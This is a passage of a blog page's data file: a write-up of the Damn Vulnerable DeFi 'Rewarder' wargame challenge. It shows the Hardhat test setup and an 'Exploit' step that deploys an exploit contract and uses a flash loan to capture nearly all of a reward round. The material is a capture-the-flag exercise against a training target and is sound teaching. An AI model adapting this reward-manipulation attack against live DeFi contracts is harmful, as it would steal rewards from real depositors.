class=\"token comment\">// Alice, Bob, Charlie and David deposit 100 tokens each</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> users<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">const</span> amount <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'100'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>liquidityToken<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>liquidityToken<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">approve</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span> amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">deposit</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">let</span> t1 <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">isNewRewardsRound</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>t1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n            <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n                <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>accountingToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>amount<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>accountingToken<span class=\"token punctuation\">.</span><span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'400'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Advance time 5 days so that depositors can get rewards</span>\n        <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"evm_increaseTime\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 5 days</span>\n\n        <span class=\"token comment\">// Each depositor gets 25 reward tokens</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> users<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">distributeRewards</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">let</span> t2 <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">lastSnapshotIdForRewards</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token builtin\">console</span><span class=\"token punctuation\">.</span><span class=\"token function\">log</span><span class=\"token punctuation\">(</span>t2<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n                <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span>\n            <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'25'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token punctuation\">}</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'100'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Attacker starts with zero DVT tokens in balance</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>liquidityToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        \n        <span class=\"token comment\">// Two rounds should have occurred so far</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">roundNumber</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">'2'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">it</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> <span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** CODE YOUR EXPLOIT HERE */</span>\n        <span class=\"token keyword\">const</span> exploitFacotry <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span><span class=\"token function\">getContractFactory</span><span class=\"token punctuation\">(</span><span class=\"token string\">'Exploit'</span><span class=\"token punctuation\">,</span> attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">const</span> exploit <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> exploitFacotry<span class=\"token punctuation\">.</span><span class=\"token function\">deploy</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>flashLoanPool<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewardToken<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n            <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>liquidityToken<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">,</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">await</span> ethers<span class=\"token punctuation\">.</span>provider<span class=\"token punctuation\">.</span><span class=\"token function\">send</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"evm_increaseTime\"</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">[</span><span class=\"token number\">5</span> <span class=\"token operator\">*</span> <span class=\"token number\">24</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span> <span class=\"token operator\">*</span> <span class=\"token number\">60</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span> <span class=\"token comment\">// 5 days</span>\n        <span class=\"token keyword\">await</span> exploit<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">_exploit</span><span class=\"token punctuation\">(</span><span class=\"token constant\">TOKENS_IN_LENDER_POOL</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token function\">after</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">async</span> <span class=\"token keyword\">function</span> <span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n        <span class=\"token comment\">/** SUCCESS CONDITIONS */</span>\n        \n        <span class=\"token comment\">// Only one round should have taken place</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">roundNumber</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">'3'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Users should get neglegible rewards this round</span>\n        <span class=\"token keyword\">for</span> <span class=\"token punctuation\">(</span><span class=\"token keyword\">let</span> i <span class=\"token operator\">=</span> <span class=\"token number\">0</span><span class=\"token punctuation\">;</span> i <span class=\"token operator\">&lt;</span> users<span class=\"token punctuation\">.</span>length<span class=\"token punctuation\">;</span> i<span class=\"token operator\">++</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n            <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewarderPool<span class=\"token punctuation\">.</span><span class=\"token function\">connect</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">distributeRewards</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token keyword\">let</span> rewards <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>users<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            \n            <span class=\"token comment\">// The difference between current and previous rewards balance should be lower than 0.01 tokens</span>\n            <span class=\"token keyword\">let</span> delta <span class=\"token operator\">=</span> rewards<span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'25'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n            <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>delta<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">lt</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseUnits</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">16</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n        <span class=\"token punctuation\">}</span>\n        \n        <span class=\"token comment\">// Rewards must have been issued to the attacker account</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">totalSupply</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">gt</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'100'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token keyword\">let</span> rewards <span class=\"token operator\">=</span> <span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>rewardToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// The amount of rewards earned should be really close to 100 tokens</span>\n        <span class=\"token keyword\">let</span> delta <span class=\"token operator\">=</span> ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseEther</span><span class=\"token punctuation\">(</span><span class=\"token string\">'100'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token function\">sub</span><span class=\"token punctuation\">(</span>rewards<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span>delta<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span>be<span class=\"token punctuation\">.</span><span class=\"token function\">lt</span><span class=\"token punctuation\">(</span>ethers<span class=\"token punctuation\">.</span>utils<span class=\"token punctuation\">.</span><span class=\"token function\">parseUnits</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1'</span><span class=\"token punctuation\">,</span> <span class=\"token number\">17</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n        <span class=\"token comment\">// Attacker finishes with zero DVT tokens in balance</span>\n        <span class=\"token function\">expect</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">await</span> <span class=\"token keyword\">this</span><span class=\"token punctuation\">.</span>liquidityToken<span class=\"token punctuation\">.</span><span class=\"token function\">balanceOf</span><span class=\"token punctuation\">(</span>attacker<span class=\"token punctuation\">.</span>address<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>to<span class=\"token punctuation\">.</span><span class=\"token function\">eq</span><span class=\"token punctuation\">(</span><span class=\"token string\">'0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">}</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span></code></pre></div>\n<h2 id=\"next-time-\" style=\"position:relative;\"><a href=\"#next-time-\" aria-label=\"next time  permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>next time.. </h2>\n<p>I will continue to post auditing and research on 12 challenge defi Smart Contracts.</p>\n<p>Thank you for the @tinchoabbate that made a good wargame.\n<a href=\"https://www.damnvulnerabledefi.xyz/\">Damn Vunlerable Defi</a></p>\n<div class=\"table-of-contents\">\n<ul>\n<li>\n<p><a href=\"#code-audit\">Code Audit</a></p>\n<ul>\n<li><a href=\"#dependency\">Dependency</a></li>\n<li><a href=\"#functions\">Functions</a></li>\n<li><a href=\"#dependency-1\">Dependency</a></li>\n<li><a href=\"#state-variable\">State Variable</a></li>\n<li><a href=\"#functions-1\">Functions</a></li>\n<li><a href=\"#dependency-2\">Dependency</a></li>\n<li><a href=\"#state-variable-1\">State Variable</a></li>\n<li><a href=\"#functions-2\">Functions</a></li>\n<li><a href=\"#dependency-3\">Dependency</a></li>\n<li><a href=\"#state-variable-2\">State Variable</a></li>\n<li><a href=\"#functions-3\">Functions</a></li>\n</ul>\n</li>\n<li>\n<p><a href=\"#contract-business-flow\">Contract Business Flow</a></p>\n</li>\n<li>\n<p><a href=\"#vulnerability\">Vulnerability</a></p>\n</li>\n<li>\n<p><a href=\"#solve\">Solve</a></p>\n</li>\n<li>\n<p><a href=\"#next-time-\">next time.. </a></p>\n</li>\n</ul>\n</div>","frontmatter":{"date":"August 01, 2022","title":"Damn Vulnerable DeFi Wargame Challenge5  The Rewarder Contract Analysis ","categories":"Blockchain","author":"Zer0Luck","emoji":""},"fields":{"slug":"/defi-wargame-5/"}},"site":{"siteMetadata":{"siteUrl":"https://zer0luck.kr","comments":{"utterances":{"repo":"dnsdudrla97/dnsdudrla97.github.io"}}}}},"pageContext":{"slug":"/Ovice.in-Picket-Static-Object-XSS-0-day-Vulnerability-Report/","nextSlug":"/Ovice.in-XSS-unsafe-token-theft/","prevSlug":"/defi-wargame-5/"}},
    "staticQueryHashes": ["1073350324","1956554647","2938748437"]}